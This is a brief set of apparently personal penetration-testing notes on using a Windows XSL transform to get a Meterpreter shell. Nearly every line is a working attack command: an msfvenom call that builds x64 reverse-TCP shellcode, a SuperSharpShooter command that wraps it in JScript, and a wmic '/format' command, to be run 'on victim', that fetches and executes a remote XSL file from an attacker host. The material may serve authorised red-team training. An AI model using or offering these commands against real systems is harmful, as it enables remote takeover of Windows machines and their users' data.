# XSL Transform

Can be combined with JScript code (SuperSharpShooter) to get a meterpreter shell.
-- We can use x64 shellcode.

### Create shellcode:
- `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=443 -f raw -o output/shell.txt`

### Create JScript using SuperSharpShooter:

`python3 SuperSharpShooter.py --payload js --dotnetver 4 --stageless --rawscfile shell.txt --output test`

Embed the JS content to the XSL template, and on victim, run: `wmic process get /format:"http://192.168.0.1/test.xsl"`
